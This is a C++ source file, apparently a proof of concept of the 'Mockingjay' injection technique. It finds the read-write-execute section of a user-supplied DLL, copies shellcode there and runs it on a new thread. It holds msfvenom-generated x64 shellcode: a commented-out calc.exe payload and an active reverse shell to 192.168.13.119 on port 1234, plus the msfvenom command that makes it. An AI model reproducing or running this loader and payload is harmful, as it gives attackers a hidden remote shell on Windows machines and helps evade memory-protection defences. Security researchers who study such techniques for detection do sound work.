#include <iostream>
#include <Windows.h>
#include <Psapi.h>
#include <dbghelp.h>
#include <vector>
#include <iomanip>

// Calc shellcode. Thread stuff working great with it, not with reverse shell
/*unsigned char Shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";*/

// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.13.119 LPORT=1234 -f c
unsigned char Shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x04\xd2\xc0\xa8\x0d\x77"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";


struct SectionDescriptor {
    LPVOID start;
    LPVOID end;
};

// Function to find offset of RWX section in given DLL
DWORD_PTR FindRWXOffset(HMODULE hModule) {
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader != NULL) {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
                DWORD_PTR baseAddress = (DWORD_PTR)hModule;
                DWORD_PTR sectionOffset = sectionHeader->VirtualAddress;
                std::cout << "Base Adress : " << std::hex << baseAddress << std::endl;
                std::cout << "Section Offset : " << std::hex << sectionOffset << std::endl;
                return sectionOffset;
            }
            sectionHeader++;
        }
    }
    return 0;
}

// Function to find size of RWX section in given DLL
DWORD_PTR FindRWXSize(HMODULE hModule) {
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader != NULL) {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
                DWORD_PTR sectionSize = sectionHeader->SizeOfRawData;
                std::cout << "Size of RWX section : " << std::dec << sectionSize << std::endl;
                return sectionSize;
            }
            sectionHeader++;
        }
    }
    return 0;
}

// Function to compare the size of the RWX section and shellcode
bool IsShellcodeFitting(DWORD_PTR rwxSectionSize, SIZE_T shellcodeSize) {
    return (shellcodeSize <= rwxSectionSize);
}

// Function to write Shellcode to RWX section of DLL
BOOL WriteCodeToSection(LPVOID rwxSectionAddr, const unsigned char* shellcode, SIZE_T sizeShellcode, DWORD_PTR rwxSectionSize) {
    std::cout << "Size of shellcode : " << std::dec << sizeShellcode << "\n";
    if (IsShellcodeFitting(rwxSectionSize, sizeShellcode)) {
        // Write the shellcode in the RWX section only if the size of the DLL's RWX section is large enough
        memcpy(rwxSectionAddr, shellcode, sizeShellcode);
        std::cout << std::dec << sizeShellcode << " bytes of shellcode written to RWX Memory Region\n";
        return true;
    }
    else {
        std::cout << "[!] Error: Shellcode is too big for the RWX section.\n";
        return false;
    }
}

// Function to execute Shellcode from RWX section of DLL
void ExecuteShellcode(LPVOID lpParam) {
    //LPVOID rwxSectionAddr = lpParam;
    unsigned char* shellcode = reinterpret_cast<unsigned char*>(lpParam);
    // Define a function pointer to the shellcode
    using ShellcodeFunction = void(*)();
    ShellcodeFunction shellcodeFunction = reinterpret_cast<ShellcodeFunction>(shellcode);

    // Call the shellcode function
    shellcodeFunction();
    std::cout << "Execution of shellcode from RWX Memory Region\n"; // Not displayed, not sure why
}

// Wrapper function with LPTHREAD_START_ROUTINE signature (not quite sure I got this right). I think it's some kind of bridge between CreateThread() and ExecuteShellcode()
DWORD WINAPI ShellcodeThreadWrapper(LPVOID lpParam) {
    // Call the actual shellcode execution function
    ExecuteShellcode(lpParam);
    return 0;
}

int main(int argc, char* argv[]) {

    std::cout << "\nMOCKINGJAY SUPER ASCII ART\n\n";

    if (argc != 2) {
        std::cerr << "Error: Please provide the path to the DLL as a positional argument.\n";
        std::cout << "Usage: " << argv[0] << " PATH_TO_DLL" << std::endl;
        return 1;
    }

    // Necessary to convert the DLL path to wide string to properly handle possible spaces in path
    std::wstring dllPath = std::wstring(argv[1], argv[1] + strlen(argv[1]));

    // Load DLL from argument
    HMODULE TargetDLL = ::LoadLibraryW(reinterpret_cast<LPCWSTR>(dllPath.c_str()));

    if (TargetDLL == nullptr) {
        // Failed to load the DLL
        std::cout << "[!] Failed to load the targeted DLL\n";
        return 1;
    }

    MODULEINFO moduleInfo;
    if (!::GetModuleInformation(::GetCurrentProcess(),TargetDLL,&moduleInfo,sizeof(MODULEINFO))) {
        std::cout << "[!] Failed to get module info\n";
        return 1;
    }

    // Find the offset and size of RWX section in the DLL
    DWORD_PTR RWX_SECTION_OFFSET = FindRWXOffset(TargetDLL);
    DWORD_PTR RWX_SECTION_SIZE = FindRWXSize(TargetDLL);


    // Access the default RWX section (Vulnerable DLL address + offset)
    LPVOID rwxSectionAddr = reinterpret_cast<LPVOID>(reinterpret_cast<PBYTE>(moduleInfo.lpBaseOfDll) + RWX_SECTION_OFFSET);
    std::cout << "Address of RWX Section : " << rwxSectionAddr << std::endl;

    SectionDescriptor descriptor = SectionDescriptor{
        rwxSectionAddr, reinterpret_cast<LPVOID>(reinterpret_cast<PBYTE>(rwxSectionAddr) + RWX_SECTION_SIZE)
    };
    std::cout << "RWX section starts at " << descriptor.start << " and ends at " << descriptor.end << std::endl;

    // Call write function
    if (WriteCodeToSection(rwxSectionAddr, Shellcode, sizeof(Shellcode), FindRWXSize(TargetDLL))) {
        // Shellcode was written successfully, proceed with execution of the shellcode on separate thread
        HANDLE hThread = CreateThread(NULL, 0, ShellcodeThreadWrapper, rwxSectionAddr, 0, NULL);
        if (hThread == NULL) {
            std::cout << "[!] Error creating thread.\n";
            return 1;
        }

        // Wait for the shellcode thread to complete
        WaitForSingleObject(hThread, INFINITE); // Maybe need to change INFINITE. Need more tests...
        CloseHandle(hThread);

    } else {
        return 1;
    }

    return 0;
}
